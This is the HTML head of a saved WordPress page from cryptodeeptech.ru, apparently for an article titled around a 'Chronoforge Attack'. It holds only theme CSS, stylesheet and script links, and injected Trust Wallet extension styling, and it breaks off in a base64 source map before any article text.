0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
/*# sourceURL=global-styles-inline-css */
</style>

<link rel="stylesheet" id="wp-date-remover-css" href="./Chronoforge_Attack__files/wmac_single_e6094661d8923e95b233019ebff7c8f0.css" media="all">
<link rel="stylesheet" id="itng-fonts-css" href="./Chronoforge_Attack__files/css" media="all">
<link rel="stylesheet" id="itng-style-css" href="./Chronoforge_Attack__files/wmac_single_8de4505c66a21eefd3c1c98b6400e4e1.css" media="all">
<link rel="stylesheet" id="itng-main-style-css" href="./Chronoforge_Attack__files/wmac_single_d1cf6f49400112d539e59eee9b75e10d.css" media="all">
<style id="itng-main-style-inline-css">
.custom-logo-link img {width: 400px;}@media screen and (min-width: 992px) {#header-image .header-overlay {
            opacity: 0.01;
        }}
ins,
	.nav-wrapper,
	#menu,
	.main-navigation ul#menu-desktop ul,
	#itng-featured-news .slider-post-wrapper .posted-on a,
	#itng-featured-news #itng-featured-news-list-container .posted-on a,
	#itng-featured-posts .itng-featured-post-date,
	#itng-featured-news #itng-featured-news-carousel-container .posted-on a,
	#colophon,
	[class^=itng-search] form,
	#itng-featured-cat .featured-cat-thumb h2,
	#itng-featured-cat .featured-cat-thumb h3
	{background-color: #008bca}article .entry-meta a,
	article .blog-footer,
	article .blog-footer a,
	.widget a,
	.nav-links a,
	.itng-pagination .nav-links > a,
	.itng-pagination .dots
	{color: #008bca !important}blockquote,
	#itng-content-title span
	{border-color: #008bca}button.top-menu-mobile
	{background-color: #43bdf2 !important}#footer-sidebar .widget-title
	{color: #43bdf2 !important}
/*# sourceURL=itng-main-style-inline-css */
</style>
<link rel="stylesheet" id="bootstrap-css" href="./Chronoforge_Attack__files/wmac_single_d26191bd0380b0cf97525a613b8b566c.css" media="all">
<link rel="stylesheet" id="owl-css" href="./Chronoforge_Attack__files/wmac_single_c8322bd5bffc8e2856f2cbcd03c61d18.css" media="all">
<link rel="stylesheet" id="mag-popup-css" href="./Chronoforge_Attack__files/wmac_single_30b593b71d7672658f89bfea0ab360c9.css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="./Chronoforge_Attack__files/wmac_single_c495654869785bc3df60216616814ad1.css" media="all">
<script async="" src="./Chronoforge_Attack__files/timeme.min.js" id="burst-timeme-js"></script>
<script async="" src="./Chronoforge_Attack__files/burst.min.js" id="burst-js"></script>
<script src="./Chronoforge_Attack__files/jquery.min.js" id="jquery-core-js"></script>
<script src="./Chronoforge_Attack__files/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script src="./Chronoforge_Attack__files/wmac_single_49cea0a781874a962879c2caca9bc322.js" id="wp-date-remover-js"></script>
<link rel="https://api.w.org/" href="https://cryptodeeptech.ru/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="https://cryptodeeptech.ru/wp-json/wp/v2/posts/3734"><!-- Analytics by WP Statistics - https://wp-statistics.com -->
		<style type="text/css">
						#header-image {
						background-image: url(https://cryptodeeptech.ru/wp-content/uploads/2022/07/header3.jpg);
						background-size: cover;
						background-repeat: repeat;
						background-position: center center;
				}
							.site-title, .site-description {
				display: none;
				position: absolute;
				clip: rect(1px, 1px, 1px, 1px);
				}
					</style>
		<style id="custom-background-css">
body.custom-background { background-color: #eff3fd; }
</style>
	<link rel="icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-32x32.png" sizes="32x32">
<link rel="icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-180x180.png">
<meta name="msapplication-TileImage" content="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-270x270.png">
<style id="core-block-supports-inline-css">
.wp-elements-909ddb83b2a3c5a0264939172268aed6 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-9bb2b1d2674d1664f7e38a66ff943785 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-9d74e199db75267611213a9d05c8e413 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-a587e97c93f13ebf7d4c3a5d196cb763 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-af703366de5883c5e786bd019f8aba8e a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-f20658b3f8281fc072b0f43a9c516580 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-19103d98ad82fed255ceb196b1cc7978 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-f9816116866479a3ba395777dfac8b3d a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-f47843c46803ccc1b6e0735d61ad54bf a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-03b2bd7446cc2fad00f86a4b71943b0e a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-85ecb0edd2452bf12fe71433a0166c17 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-a0629d4137d07b40a45b5e626148847d a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-32ebd7dd0ede4a629126cb42dc5e6b59 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-65928d6dac066dd2ad1a753740e297e1 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-725b91fcd89ba57eded23f5e2c00ad03 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-8c21dd73c792080899d440a11c55f078 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b49cd23d0f1c37db7e11c24797ad3b23 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-815f8fcae441f30c509de9a24d1c6c39 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-bf7eaa9197b57db2f493cdcc3e015918 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-c1ebec6039a8805f14d45ef4b016bd8d a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-2679b250f6766496c3d04e30ab60a3b5 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-622f6377968deb542131244b538386c7 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b3779d941e0ab05b71c1d38daa42767a a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-4b00a77edaec74cc1bc6ee0ad054d71f a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-4c911bf546df12ebb135758cb050ba0a a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-03f38b65a42ed03280691c643e409880 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-51938a59f4e2a743df45a475bd27f2c8 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-0459df3b040db69f51d6351d9bf4e875 a:where(:not(.wp-element-button)){color:#0f8f60;}.wp-elements-7e71c7368ad4b41419f1be9527ea6006 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-cad144cda9b0549d1e3ce94b5652707c a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-f931166de125179bf369c30e77c5ad72 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b4e61d884e0a339da1a0356b58d8c5c1 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-2367ee0fd5d3ee4ee0b71fbce5964c75 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-1c1bf7947586c891b9fb697a6b0ab2ef a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-6686e98bc88ad4e7bbaf639e855f7ce4 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-417cc6940fc037709de1e3f251b59c02 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b5b88572e5573d475ea6e785f24f3946 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b24219e869ae505149b401ed05a91f46 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-18a278b0718c4581ce59fe381730e7fa a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-f0b46b9ea5d2b9702f0679edff2c2ecb a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-56bb14fdee8241dbb3512194542ba461 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-46dbadaf2179769b63c2a8fe5fb56188 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-e105d1c7da10554be94df55e33c4a185 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-435eca6063910c920068c9e14ff75e3c a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-d1b81e1cb98422e2566084b603a9987c a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-fc0046a2093d382b30fe2a91dacbec89 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-c24b43a67eaf30776f798e362f8294aa a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b8f1c19ab8c0897dda72f9e893ebd165 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-3aa1c54045b5fa10a7b7bc33dce2b341 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-dc6b0eb5a26db634673fe20593e05e64 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-7b582bc1b88c4103fd474513154bcece a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-ecc199eb70bd9574a3afa173dfafa955 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b311970f80f8b64d05a92d03694c69f4 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-988875ab26d2826a64614630baa91a20 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-9b847559381915ef3f90bda4019df4ef a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-828d59e2c5aa2e920df6f8a2f234330c a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-2d51fb3225f2abf14456d7af7eae500b a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b0d2db0d7afbb70df575c52dd2922b54 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-f7e5960250afb51a44abed8c1cfd2245 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b8d1b8215f9fdc2ccb017b6306261dcf a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-e8bd5a496334d22b0c371359e092c9a5 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-7957b2033da792c64a76ced24cd6bcad a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-da69fc1f754c58bd3ef40f6eb4a52de5 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-4c0a87c8af58f6132d25dbd600544139 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-f295acadf91f9bbdb52ac86a3535cac2 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-ad7527948c597b38f6b83fd3d7543a3d a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-7d7367ddcf746c60643686426f92c4db a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-6351d0fac1fd0c391aa5e75365fed599 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-258347b954874ad9a61fcbb63e275cb6 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-70f8b2c02124597cc897079831d45d80 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-a8e35ad46bd0a487615b4f01f900bb65 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-027a2c027423560ecd079c64f4569e22 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-fdfa1542a5db841d9c4a06cd90cf0a18 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-8646ed4f1d35f0c9a12bc3023ec24fd8 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-5633ef663d69d5987142c629415658ad a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-e95b31c6dae215389b9fb429a7bb4ec4 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-33c7c3ff4a8ebd0c5455ceeb6f28b23a a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-67b90ed90945279d10567bf4a7629641 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-831dd3758642f1f1730251b57c2413b6 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-a45300c3c0cee69ea28b575abb803651 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-ee4ea9807d6643220bf78bb6e1f828e0 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-112ddb8dc3cf20264d13cb1aaffc8e33 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-a30c707bbec1d624dd14d4f619e5a9da a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b746cbf5e6cf091281b44edca41afcc5 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-74446678908fe52adeb47b78c462cb7b a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-74542b3dbb035951b0270e10283c8637 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-59f791fef7eb0da04bdd50cfb7c1ccab a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-7e9570a6a46dcef0cf4fe77f9f55ac35 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-172b39dc6486f8d726e95a162ae78c96 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-5ca29d9511e21ba78f38fdae4d4a4265 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-077fcfd49ccb31f58b0d04684481f2a1 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-8de8b5fb558f9e17c75cded5193567e1 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-528627138a6722171a137a8500ee3559 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-b5e02ac0ed970df1f836a415c78f9133 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-8135c1c39344a367687f5863af1c318d a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-a13fe6d7d1dd29e6d83c7062647a2021 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-d9365899d29706dde7b3b3fd870a8348 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-7f5fa9cbc63a51bc084e223a8a98f7f9 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-baf68f64cd553ffb2f4ed2ae9b2dfd9f a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-232c7c12a1415da37c784f70c4cce908 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-d4b9f5ef805ed33e60ae5c5037bed5b6 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-990c753721ff78310013111724b61370 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-27d441e0460467696d3997d369f8f60f a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-a54e2174b78294b8cec203fc677eb0d8 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-cf0383ab548809c66ddffd289cf2df29 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-4c3356f9a15ea34f1ffe941ac6cb479b a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-e7a1a99eb4a319516c2feac787cee855 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-3aafc49ce830951829177f4116cd9ed0 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-07b668e0d26ead94d38cd9b444d23313 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-bdd8576fec9fc260a60e86d3848dbe73 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-9d78a0a8bb3dc167315fcdb20b6e5eb2 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-47a16d7229354d07ebbdf5da7dd7b6b9 a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-057d803e20ee4a28fa237cec35962ffa a:where(:not(.wp-element-button)){color:#4092c2;}.wp-elements-083b7779d2652e6cf06d3e3a49c6f517 a:where(:not(.wp-element-button)){color:#4092c2;}
/*# sourceURL=core-block-supports-inline-css */
</style>

<style>@keyframes slide-in-one-tap {
  from {
    transform: translateY(80px);
  }
  to {
    transform: translateY(0px);
  }
}

.trust-hide-gracefully {
  opacity: 0;
}

.trust-wallet-one-tap .hidden {
    display: none;
  }

.trust-wallet-one-tap .semibold {
    font-weight: 500;
  }

.trust-wallet-one-tap .binance-plex {
    font-family: 'Binance';
  }

.trust-wallet-one-tap .rounded-full {
    border-radius: 50%;
  }

.trust-wallet-one-tap .flex {
    display: flex;
  }

.trust-wallet-one-tap .flex-col {
    flex-direction: column;
  }

.trust-wallet-one-tap .items-center {
    align-items: center;
  }

.trust-wallet-one-tap .space-between {
    justify-content: space-between;
  }

.trust-wallet-one-tap .justify-center {
    justify-content: center;
  }

.trust-wallet-one-tap .w-full {
    width: 100%;
  }

.trust-wallet-one-tap .box {
    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
    width: 384px;
    border-radius: 15px;
    background: #fff;
    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
    position: fixed;
    right: 30px;
    bottom: 30px;
    z-index: 1020;
  }

.trust-wallet-one-tap .header {
    gap: 15px;
    border-bottom: 1px solid #e6e6e6;
    padding: 10px 18px;
  }

.trust-wallet-one-tap .header .left-items {
      gap: 15px;
    }

.trust-wallet-one-tap .header .title {
      color: #1e2329;
      font-size: 18px;
      font-weight: 600;
      line-height: 28px;
    }

.trust-wallet-one-tap .header .subtitle {
      color: #474d57;
      font-size: 14px;
      line-height: 20px;
    }

.trust-wallet-one-tap .header .close {
      color: #1e2329;
      cursor: pointer;
    }

.trust-wallet-one-tap .body {
    padding: 9px 18px;
    gap: 10px;
  }

.trust-wallet-one-tap .body .right-items {
      gap: 10px;
      width: 100%;
    }

.trust-wallet-one-tap .body .right-items .wallet-title {
        color: #1e2329;
        font-size: 16px;
        font-weight: 600;
        line-height: 20px;
      }

.trust-wallet-one-tap .body .right-items .wallet-subtitle {
        color: #474d57;
        font-size: 14px;
        line-height: 20px;
      }

.trust-wallet-one-tap .connect-indicator {
    gap: 15px;
    padding: 8px 0;
  }

.trust-wallet-one-tap .connect-indicator .flow-icon {
      color: #474d57;
    }

.trust-wallet-one-tap .loading-color {
    color: #fff;
  }

.trust-wallet-one-tap .button {
    border-radius: 50px;
    outline: 2px solid transparent;
    outline-offset: 2px;
    background-color: rgb(5, 0, 255);
    border-color: rgb(229, 231, 235);
    cursor: pointer;
    text-align: center;
    height: 45px;
  }

.trust-wallet-one-tap .button .button-text {
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      line-height: 20px;
    }

.trust-wallet-one-tap .footer {
    margin: 20px 30px;
  }

.trust-wallet-one-tap .check-icon {
    color: #fff;
  }

@font-face {
  font-family: 'Binance';
  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
  font-weight: 400;
  font-style: normal;
}

@font-face {
  font-family: 'Binance';
  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
  font-weight: 500;
  font-style: normal;
}

@font-face {
  font-family: 'Binance';
  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
  font-weight: 600;
  font-style: normal;
}

/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ